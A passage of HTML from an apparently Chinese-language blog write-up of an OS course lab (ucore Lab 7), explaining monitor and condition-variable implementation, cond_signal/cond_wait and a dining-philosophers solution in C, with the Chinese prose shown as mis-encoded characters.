class="hljs-title">monitor</span> <span class="hljs-title">monitor_t</span>;</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">condvar</span>&#123;</span><br>    <span class="hljs-keyword">semaphore_t</span> sem;        <span class="hljs-comment">// æ¡ä»¶å˜é‡æ‰€å¯¹åº”çš„ä¿¡å·é‡</span><br>    <span class="hljs-keyword">int</span> count;              <span class="hljs-comment">// ç­‰å¾…å½“å‰æ¡ä»¶å˜é‡çš„ç­‰å¾…è¿›ç¨‹æ€»æ•°</span><br>    <span class="hljs-keyword">monitor_t</span> * owner;      <span class="hljs-comment">// å½“å‰æ¡ä»¶å˜é‡çš„çˆ¶ç®¡ç¨‹</span><br>&#125; <span class="hljs-keyword">condvar_t</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">monitor</span>&#123;</span><br>    <span class="hljs-keyword">semaphore_t</span> mutex;      <span class="hljs-comment">// ç®¡ç¨‹é”ï¼Œæ¯æ¬¡åªèƒ½æœ‰ä¸€ä¸ªè¿›ç¨‹æ‰§è¡Œç®¡ç¨‹ä»£ç ã€‚è¯¥å€¼åˆå§‹åŒ–ä¸º1</span><br>    <span class="hljs-keyword">semaphore_t</span> next;       <span class="hljs-comment">// the next semaphore is used to down the signaling proc itself, and the other OR wakeuped waiting proc should wake up the sleeped signaling proc.</span><br>    <span class="hljs-keyword">int</span> next_count;         <span class="hljs-comment">// the number of of sleeped signaling proc</span><br>    <span class="hljs-keyword">condvar_t</span> *cv;          <span class="hljs-comment">// å½“å‰ç®¡ç¨‹ä¸­å­˜æ”¾æ‰€æœ‰æ¡ä»¶å˜é‡çš„æ•°ç»„</span><br>&#125; <span class="hljs-keyword">monitor_t</span>;<br></code></pre></div></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼š<code>monitor</code>ç»“æ„ä¸­<code>next</code>ä¿¡å·é‡çš„åŠŸèƒ½è¯·åœ¨ä¸‹æ–‡ç»“åˆ<code>cond_signal</code>è¯´æ˜æ¥ç†è§£ã€‚</p></blockquote></li><li><p>åˆå§‹åŒ–ç®¡ç¨‹æ—¶ï¼Œå‡½æ•°<code>monitor_init</code>ä¼šåˆå§‹åŒ–ä¼ å…¥ç®¡ç¨‹çš„ç›¸å…³æˆå‘˜å˜é‡ï¼Œå¹¶ä¸ºè¯¥ç®¡ç¨‹è®¾ç½®å¤šä¸ªæ¡ä»¶å˜é‡å¹¶åˆå§‹åŒ–ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// Initialize monitor.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">monitor_init</span> <span class="hljs-params">(<span class="hljs-keyword">monitor_t</span> * mtp, <span class="hljs-keyword">size_t</span> num_cv)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    assert(num_cv&gt;<span class="hljs-number">0</span>);<br>    mtp-&gt;next_count = <span class="hljs-number">0</span>;<br>    mtp-&gt;cv = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">// åˆå§‹åŒ–ç®¡ç¨‹é”ä¸º1</span><br>    sem_init(&amp;(mtp-&gt;mutex), <span class="hljs-number">1</span>); <span class="hljs-comment">//unlocked</span><br>    sem_init(&amp;(mtp-&gt;next), <span class="hljs-number">0</span>);<span class="hljs-comment">// æ³¨æ„è¿™é‡Œçš„0</span><br>    <span class="hljs-comment">// åˆ†é…å½“å‰ç®¡ç¨‹å†…çš„æ¡ä»¶å˜é‡</span><br>    mtp-&gt;cv =(<span class="hljs-keyword">condvar_t</span> *) kmalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">condvar_t</span>)*num_cv);<br>    assert(mtp-&gt;cv!=<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">// åˆå§‹åŒ–ç®¡ç¨‹å†…æ¡ä»¶å˜é‡çš„å„ä¸ªå±æ€§</span><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;num_cv; i++)&#123;<br>        mtp-&gt;cv[i].count=<span class="hljs-number">0</span>;<br>        sem_init(&amp;(mtp-&gt;cv[i].sem),<span class="hljs-number">0</span>);<br>        mtp-&gt;cv[i].owner=mtp;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>å½“æŸä¸ªçº¿ç¨‹å‡†å¤‡ç¦»å¼€ä¸´ç•ŒåŒºã€å‡†å¤‡é‡Šæ”¾å¯¹åº”çš„æ¡ä»¶å˜é‡æ—¶ï¼Œçº¿ç¨‹ä¼šæ‰§è¡Œå‡½æ•°<code>cond_signal</code>ã€‚è¯¥å‡½æ•°åŒæ ·æ˜¯è¿™æ¬¡è¦å®ç°çš„å‡½æ•°ä¹‹ä¸€ã€‚</p><ul><li><p>å¦‚æœ<strong>ä¸å­˜åœ¨çº¿ç¨‹</strong>æ­£åœ¨ç­‰å¾…å¸¦é‡Šæ”¾çš„æ¡ä»¶å˜é‡ï¼Œåˆ™ä¸æ‰§è¡Œä»»ä½•æ“ä½œ</p></li><li><p>å¦åˆ™ï¼Œå¯¹ä¼ å…¥æ¡ä»¶å˜é‡å†…ç½®çš„ä¿¡å·æ‰§è¡ŒVæ“ä½œã€‚æ³¨æ„ï¼šè¿™ä¸€æ­¥å¯èƒ½ä¼šå”¤é†’æŸä¸ªç­‰å¾…çº¿ç¨‹ã€‚</p></li><li><p><strong>å…³é”®çš„ä¸€æ­¥ï¼</strong> å‡½æ•°å†…éƒ¨æ¥ä¸‹æ¥ä¼šæ‰§è¡Œ<code>down(&amp;(cvp-&gt;owner-&gt;next))</code>æ“ä½œã€‚ç”±äº<code>monitor::next</code>åœ¨åˆå§‹åŒ–æ—¶å°±è®¾ç½®ä¸º<strong>0</strong>ï¼Œæ‰€ä»¥å½“æ‰§è¡Œåˆ°è¯¥æ¡ä»£ç æ—¶ï¼Œæ— è®ºå¦‚ä½•ï¼Œ<strong>å½“å‰æ­£åœ¨æ‰§è¡Œ<code>cond_signal</code>å‡½æ•°çš„çº¿ç¨‹ä¸€å®šä¼šè¢«æŒ‚èµ·</strong>ã€‚è¿™ä¹Ÿæ­£æ˜¯ç®¡ç¨‹ä¸­<code>next</code>ä¿¡å·é‡çš„ç”¨é€”ã€‚</p><blockquote><p>ä¸ºä»€ä¹ˆè¦åšè¿™ä¸€æ­¥å‘¢ï¼ŸåŸå› æ˜¯<strong>ä¿è¯ç®¡ç¨‹ä»£ç çš„äº’æ–¥è®¿é—®</strong>ã€‚</p><p>ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼šçº¿ç¨‹1å› ç­‰å¾…æ¡ä»¶å˜é‡aè€ŒæŒ‚èµ·ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´ï¼Œçº¿ç¨‹2é‡Šæ”¾æ¡ä»¶å˜é‡aï¼Œæ­¤æ—¶çº¿ç¨‹1è¢«å”¤é†’ï¼Œå¹¶ç­‰å¾…è°ƒåº¦ã€‚æ³¨æ„ï¼<strong>æ­¤æ—¶åœ¨ç®¡ç¨‹ä»£ç ä¸­ï¼Œå­˜åœ¨ä¸¤ä¸ªæ´»è·ƒçº¿ç¨‹</strong>ï¼ˆè¿™é‡Œçš„æ´»è·ƒæŒ‡çš„æ˜¯æ­£åœ¨è¿è¡Œ/å°±ç»ªçº¿ç¨‹ï¼‰ï¼Œè€Œè¿™<strong>è¿èƒŒäº†ç®¡ç¨‹çš„äº’æ–¥æ€§</strong>ã€‚å› æ­¤ï¼Œçº¿ç¨‹2åœ¨é‡Šæ”¾æ¡ä»¶å˜é‡aååº”å½“<strong>ç«‹å³æŒ‚èµ·</strong>ä»¥ä¿è¯ç®¡ç¨‹ä»£ç äº’æ–¥ã€‚è€Œ<code>next</code>ä¿¡å·é‡ä¾¿æ˜¯å¸®åŠ©çº¿ç¨‹2ç«‹å³æŒ‚èµ·çš„ä¸€ä¸ªä¿¡å·ã€‚</p></blockquote></li></ul><p>ä»¥ä¸‹æ˜¯è¯¥å‡½æ•°çš„å®ç°ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// Unlock one of threads waiting on the condition variable.</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">cond_signal</span> <span class="hljs-params">(<span class="hljs-keyword">condvar_t</span> *cvp)</span> </span>&#123;<br>   <span class="hljs-comment">//LAB7 EXERCISE1: YOUR CODE</span><br>   cprintf(<span class="hljs-string">&quot;cond_signal begin: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);  <br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">   *      cond_signal(cv) &#123;</span><br><span class="hljs-comment">   *          if(cv.count&gt;0) &#123;</span><br><span class="hljs-comment">   *             mt.next_count ++;</span><br><span class="hljs-comment">   *             signal(cv.sem);</span><br><span class="hljs-comment">   *             wait(mt.next);</span><br><span class="hljs-comment">   *             mt.next_count--;</span><br><span class="hljs-comment"> *          &#125;</span><br><span class="hljs-comment">   *       &#125;</span><br><span class="hljs-comment">   */</span><br>    <span class="hljs-keyword">if</span>(cvp-&gt;count&gt;<span class="hljs-number">0</span>) &#123;<br>        cvp-&gt;owner-&gt;next_count ++;<br>        up(&amp;(cvp-&gt;sem));<br>        down(&amp;(cvp-&gt;owner-&gt;next));<br>        cvp-&gt;owner-&gt;next_count --;<br>   &#125;<br>   cprintf(<span class="hljs-string">&quot;cond_signal end: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>å½“æŸä¸ªçº¿ç¨‹éœ€è¦ç­‰å¾…é”æ—¶ï¼Œåˆ™ä¼šæ‰§è¡Œ<code>cond_wait</code>å‡½æ•°ã€‚è€Œè¯¥å‡½æ•°æ˜¯æˆ‘ä»¬è¿™æ¬¡è¦å®ç°çš„å‡½æ•°ä¹‹ä¸€ã€‚</p><ul><li><p>å½“æŸä¸ªçº¿ç¨‹å› ä¸ºç­‰å¾…æ¡ä»¶å˜é‡è€Œ<strong>å‡†å¤‡</strong>å°†<strong>è‡ªèº«æŒ‚èµ·</strong>å‰ï¼Œæ­¤æ—¶æ¡ä»¶å˜é‡ä¸­çš„<code>count</code>å˜é‡åº”è‡ªå¢1ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">cvp-&gt;count++;<br></code></pre></div></td></tr></table></figure></li><li><p>ä¹‹åå½“å‰è¿›ç¨‹åº”è¯¥é‡Šæ”¾<strong>æ‰€ç­‰å¾…çš„æ¡ä»¶å˜é‡æ‰€å±çš„ç®¡ç¨‹äº’æ–¥é”</strong>ï¼Œä»¥ä¾¿äºè®©å…¶ä»–çº¿ç¨‹æ‰§è¡Œç®¡ç¨‹ä»£ç ã€‚</p><p>ä½†å¦‚æœå­˜åœ¨ä¸€ä¸ªå·²ç»åœ¨ç®¡ç¨‹ä¸­ã€ä½†å› ä¸ºæ‰§è¡Œ<code>cond_signal</code>è€ŒæŒ‚èµ·çš„çº¿ç¨‹ï¼Œåˆ™ä¼˜å…ˆç»§ç»­æ‰§è¡Œè¯¥çº¿ç¨‹ã€‚</p><blockquote><p>æœ‰å…³â€œå› ä¸ºæ‰§è¡Œ<code>cond_signal</code>è€ŒæŒ‚èµ·çš„çº¿ç¨‹â€çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·é˜…è¯»ä¸Šæ–¹<code>cond_signal</code>å‡½æ•°çš„ä»‹ç»æ¥äº†è§£ã€‚</p></blockquote><p>å¦‚æœç¨‹åºé€‰æ‹©æ‰§è¡Œ<code>up(&amp;(cvp-&gt;owner-&gt;next))</code>ï¼Œè¯·æ³¨æ„ï¼š<strong>æ­¤æ—¶mutexæ²¡æœ‰è¢«é‡Šæ”¾</strong>ã€‚å› ä¸ºå½“å‰çº¿ç¨‹å°†è¢«æŒ‚èµ·ï¼ŒåŸå…ˆå­˜åœ¨äºç®¡ç¨‹ä¸­çš„çº¿ç¨‹è¢«å”¤é†’ï¼Œæ­¤æ—¶ç®¡ç¨‹ä¸­ä»ç„¶åªæœ‰ä¸€ä¸ªæ´»è·ƒçº¿ç¨‹ï¼Œä¸éœ€è¦è®©æ–°çš„çº¿ç¨‹è¿›å…¥ç®¡ç¨‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(cvp-&gt;owner-&gt;next_count &gt; <span class="hljs-number">0</span>)<br>    up(&amp;(cvp-&gt;owner-&gt;next));<br><span class="hljs-keyword">else</span><br>    up(&amp;(cvp-&gt;owner-&gt;mutex));<br></code></pre></div></td></tr></table></figure></li><li><p>é‡Šæ”¾ç®¡ç¨‹åï¼Œå°è¯•è·å–è¯¥æ¡ä»¶å˜é‡ã€‚å¦‚æœè·å–å¤±è´¥ï¼Œåˆ™å½“å‰çº¿ç¨‹å°†åœ¨<code>down</code>å‡½æ•°çš„å†…éƒ¨è¢«æŒ‚èµ·ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">down(&amp;(cvp-&gt;sem));<br></code></pre></div></td></tr></table></figure></li><li><p>è‹¥å½“å‰çº¿ç¨‹æˆåŠŸè·å–æ¡ä»¶å˜é‡ï¼Œåˆ™å½“å‰ç­‰å¾…æ¡ä»¶å˜é‡çš„çº¿ç¨‹æ•°å‡ä¸€ã€‚</p><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm"><span class="hljs-title">cvp</span>-&gt;count<span class="hljs-comment">--;</span><br></code></pre></div></td></tr></table></figure></li></ul><p>ä»¥ä¸‹æ˜¯æœ€ç»ˆä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// Suspend calling thread on a condition variable waiting for condition Atomically unlocks</span><br><span class="hljs-comment">// mutex and suspends calling thread on conditional variable after waking up locks mutex. Notice: mp is mutex semaphore for monitor&#x27;s procedures</span><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">cond_wait</span> <span class="hljs-params">(<span class="hljs-keyword">condvar_t</span> *cvp)</span> </span>&#123;<br>    <span class="hljs-comment">//LAB7 EXERCISE1: YOUR CODE</span><br>    cprintf(<span class="hljs-string">&quot;cond_wait begin:  cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);<br>   <span class="hljs-comment">/*</span><br><span class="hljs-comment">    *         cv.count ++;</span><br><span class="hljs-comment">    *         if(mt.next_count&gt;0)</span><br><span class="hljs-comment">    *            signal(mt.next)</span><br><span class="hljs-comment">    *         else</span><br><span class="hljs-comment">    *            signal(mt.mutex);</span><br><span class="hljs-comment">    *         wait(cv.sem);</span><br><span class="hljs-comment">    *         cv.count --;</span><br><span class="hljs-comment">    */</span><br>    cvp-&gt;count++;<br>    <span class="hljs-keyword">if</span>(cvp-&gt;owner-&gt;next_count &gt; <span class="hljs-number">0</span>)<br>        up(&amp;(cvp-&gt;owner-&gt;next));<br>    <span class="hljs-keyword">else</span><br>        up(&amp;(cvp-&gt;owner-&gt;mutex));<br>    down(&amp;(cvp-&gt;sem));<br>    cvp-&gt;count--;<br><br>    cprintf(<span class="hljs-string">&quot;cond_wait end:  cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>ç®¡ç¨‹ä¸­å‡½æ•°çš„å…¥å£å‡ºå£è®¾è®¡</p><ul><li><p>ä¸ºäº†è®©æ•´ä¸ªç®¡ç¨‹æ­£å¸¸è¿è¡Œï¼Œè¿˜éœ€åœ¨ç®¡ç¨‹ä¸­çš„æ¯ä¸ªå‡½æ•°çš„å…¥å£å’Œå‡ºå£å¢åŠ ç›¸å…³æ“ä½œï¼Œå³ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">monitorFunc</span><span class="hljs-params">()</span> </span>&#123;<br>     down(&amp;(mtp-&gt;mutex));<br><span class="hljs-comment">//--------into routine in monitor--------------</span><br>      <span class="hljs-comment">// ...</span><br><span class="hljs-comment">//--------leave routine in monitor--------------</span><br>      <span class="hljs-keyword">if</span>(mtp-&gt;next_count&gt;<span class="hljs-number">0</span>)<br>         up(&amp;(mtp-&gt;next));<br>      <span class="hljs-keyword">else</span><br>         up(&amp;(mtp-&gt;mutex));<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>è¿™æ ·åšçš„å¥½å¤„æœ‰ä¸¤ä¸ª</p><ul><li>åªæœ‰ä¸€ä¸ªè¿›ç¨‹åœ¨æ‰§è¡Œç®¡ç¨‹ä¸­çš„å‡½æ•°ã€‚</li><li>é¿å…ç”±äºæ‰§è¡Œäº†<code>cond_signal</code>å‡½æ•°è€Œç¡çœ çš„è¿›ç¨‹æ— æ³•è¢«å”¤é†’ã€‚</li></ul></li><li><p>é’ˆå¯¹ <strong>â€œé¿å…ç”±äºæ‰§è¡Œäº†<code>cond_signal</code>å‡½æ•°è€Œç¡çœ çš„è¿›ç¨‹æ— æ³•è¢«å”¤é†’â€œ</strong> è¿™ä¸ªä¼˜ç‚¹ç®€å•è¯´ä¸€ä¸‹</p><ul><li>ç®¡ç¨‹ä¸­<code>wait</code>å’Œ<code>signal</code>å‡½æ•°çš„è°ƒç”¨å­˜åœ¨æ—¶é—´é¡ºåºã€‚ä¾‹å¦‚ï¼šå½“çº¿ç¨‹1å…ˆè°ƒç”¨<code>signal</code>å”¤é†’çº¿ç¨‹2å¹¶å°†è‡ªèº«çº¿ç¨‹æŒ‚èµ·åï¼Œçº¿ç¨‹2åœ¨å¼€å§‹æ‰§è¡Œæ—¶å°†æ— æ³•å”¤é†’åŸå…ˆçš„åœ¨<code>signal</code>ä¸­æŒ‚èµ·çš„çº¿ç¨‹1ã€‚</li><li>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>åªè¦å­˜åœ¨çº¿ç¨‹åœ¨ç®¡ç¨‹ä¸­æ‰§è¡Œäº†<code>signal</code>ï¼Œé‚£ä¹ˆè‡³å°‘å­˜åœ¨ä¸€ä¸ªçº¿ç¨‹åœ¨ç®¡ç¨‹ä¸­è¢«æŒ‚èµ·</strong>ã€‚</li><li>æ­¤æ—¶ï¼Œå°±åªèƒ½åœ¨ä¸´ç•ŒåŒºå¤–å”¤é†’æŒ‚èµ·çš„çº¿ç¨‹1ï¼Œè€Œè¿™ä¸€æ­¥åœ¨ä»£ç ä¸­ä¹Ÿå¾—åˆ°äº†å®ç°ã€‚</li></ul></li></ul></li></ul><blockquote><p>è¯·åœ¨å®éªŒæŠ¥å‘Šä¸­ç»™å‡ºç»™ç”¨æˆ·æ€è¿›ç¨‹/çº¿ç¨‹æä¾›ä¿¡å·é‡æœºåˆ¶çš„è®¾è®¡æ–¹æ¡ˆï¼Œå¹¶æ¯”è¾ƒè¯´æ˜ç»™å†…æ ¸çº§æä¾›ä¿¡å·é‡æœºåˆ¶çš„å¼‚åŒã€‚</p></blockquote><p>ç”¨æˆ·æ€è¿›ç¨‹/çº¿ç¨‹çš„ä¿¡å·é‡æœºåˆ¶å¯ä»¥æ²¿ç”¨å†…æ ¸çº§ä¿¡å·é‡çš„å®ç°ï¼Œå¢åŠ ä¸€ä¸‹æ¥å£ç”¨äºè°ƒç”¨å³å¯ï¼š</p><p>åº”è¯¥é¦–å…ˆé€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›è¡Œsemçš„åˆå§‹åŒ–ï¼Œè®¾ç½®sem.valueä»¥åŠsem.wait_queue</p><ul><li><p>sem_postå’Œsem_waitï¼šPæ“ä½œå’ŒVæ“ä½œæ¥å£ã€‚</p></li><li><p>sem_get_valueï¼šè·å–ä¿¡å·é‡å½“å‰çš„å€¼ã€‚</p></li><li><p>sem_closeï¼šåˆ é™¤è°ƒç”¨è¿›ç¨‹ä¸å®ƒä¹‹å‰æ‰“å¼€çš„ä¸€ä¸ªä¿¡å·é‡ä¹‹é—´çš„å…³è”å…³ç³»ã€‚</p></li><li><p>sem_delï¼šåˆ é™¤ä¸€ä¸ªä¿¡å·é‡åå­—å¹¶å°†å…¶æ ‡è®°ä¸ºåœ¨æ‰€æœ‰è¿›ç¨‹å…³é—­è¯¥ä¿¡å·é‡æ—¶åˆ é™¤è¯¥ä¿¡å·é‡ã€‚</p></li></ul><p>ä¸åŒï¼šåœ¨ç”¨æˆ·æ€ä½¿ç”¨ä¿¡å·é‡æ—¶ï¼Œéœ€è¦è¿›è¡Œç³»ç»Ÿè°ƒç”¨è¿›å…¥åˆ°å†…æ ¸æ€è¿›è¡Œæ“ä½œã€‚</p><blockquote><ol><li>ç”¨ç®¡ç¨‹æœºåˆ¶å®ç°å“²å­¦å®¶å°±é¤é—®é¢˜çš„è§£å†³æ–¹æ¡ˆï¼ˆåŸºäºæ¡ä»¶å˜é‡ï¼‰</li></ol></blockquote><ul><li><p>è¿™é¢˜æ¶‰åŠåˆ°äº†ä¸¤ä¸ªå‡½æ•°ï¼Œåˆ†åˆ«æ˜¯<code>phi_take_forks_condvar</code>å’Œ<code>phi_put_forks_condvar</code>ã€‚ä¸ä¿¡å·é‡æ‰€å®ç°çš„å“²å­¦å®¶å°±é¤é—®é¢˜ç±»ä¼¼ï¼Œå¤§ä½“é€»è¾‘æ˜¯ä¸€è‡´çš„ã€‚</p></li><li><p>é¦–å…ˆï¼Œå“²å­¦å®¶éœ€è¦å°è¯•è·å–åˆ€å‰ï¼Œå¦‚æœåˆ€å‰æ²¡æœ‰è·å–åˆ°ï¼Œåˆ™ç­‰å¾…åˆ€å‰ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">phi_take_forks_condvar</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> </span>&#123;<br>     down(&amp;(mtp-&gt;mutex));<br><span class="hljs-comment">//--------into routine in monitor--------------</span><br>     <span class="hljs-comment">// LAB7 EXERCISE1: YOUR CODE</span><br>     <span class="hljs-comment">// I am hungry</span><br>     state_condvar[i]=HUNGRY; <span class="hljs-comment">/* è®°å½•ä¸‹å“²å­¦å®¶ié¥¥é¥¿çš„äº‹å® */</span><br>     <span class="hljs-comment">// try to get fork</span><br>     phi_test_condvar(i);<br>     <span class="hljs-keyword">if</span> (state_condvar[i] != EATING) &#123;<br>          cprintf(<span class="hljs-string">&quot;phi_take_forks_condvar: %d didn&#x27;t get fork and will wait\n&quot;</span>,i);<br>          cond_wait(&amp;mtp-&gt;cv[i]);<br>      &#125;<br><span class="hljs-comment">//--------leave routine in monitor--------------</span><br>      <span class="hljs-keyword">if</span>(mtp-&gt;next_count&gt;<span class="hljs-number">0</span>)<br>         up(&amp;(mtp-&gt;next));<br>      <span class="hljs-keyword">else</span><br>         up(&amp;(mtp-&gt;mutex));<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>ä¹‹åï¼Œå½“å“²å­¦å®¶æ”¾ä¸‹åˆ€å‰æ—¶ï¼Œå¦‚æœå·¦å³ä¸¤è¾¹çš„å“²å­¦å®¶éƒ½æ»¡è¶³æ¡ä»¶å¯ä»¥è¿›é¤ï¼Œåˆ™è®¾ç½®å¯¹åº”çš„æ¡ä»¶å˜é‡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">phi_put_forks_condvar</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> </span>&#123;<br>     down(&amp;(mtp-&gt;mutex));<br><span class="hljs-comment">//--------into routine in monitor--------------</span><br>     <span class="hljs-comment">// LAB7 EXERCISE1: YOUR CODE</span><br>     <span class="hljs-comment">// I ate over</span><br>     state_condvar[i]=THINKING; <span class="hljs-comment">/* å“²å­¦å®¶è¿›é¤ç»“æŸ */</span><br>     <span class="hljs-comment">// test left and right neighbors</span><br>     phi_test_condvar(LEFT); <span class="hljs-comment">/* çœ‹ä¸€ä¸‹å·¦é‚»å±…ç°åœ¨æ˜¯å¦èƒ½è¿›é¤ */</span><br>     phi_test_condvar(RIGHT); <span class="hljs-comment">/* çœ‹ä¸€ä¸‹å³é‚»å±…ç°åœ¨æ˜¯å¦èƒ½è¿›é¤ */</span><br><span class="hljs-comment">//--------leave routine in monitor--------------</span><br>     <span class="hljs-keyword">if</span>(mtp-&gt;next_count&gt;<span class="hljs-number">0</span>)<br>        up(&amp;(mtp-&gt;next));<br>     <span class="hljs-keyword">else</span><br>        up(&amp;(mtp-&gt;mutex));<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>ä»¥ä¸‹æ˜¯å“²å­¦å®¶å°è¯•è¿›é¤çš„ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">phi_test_condvar</span> <span class="hljs-params">(i)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(state_condvar[i]==HUNGRY&amp;&amp;state_condvar[LEFT]!=EATING<br>            &amp;&amp;state_condvar[RIGHT]!=EATING) &#123;<br>        cprintf(<span class="hljs-string">&quot;phi_test_condvar: state_condvar[%d] will eating\n&quot;</span>,i);<br>        state_condvar[i] = EATING ;<br>        cprintf(<span class="hljs-string">&quot;phi_test_condvar: signal self_cv[%d] \n&quot;</span>,i);<br>        cond_signal(&amp;mtp-&gt;cv[i]) ;<br>    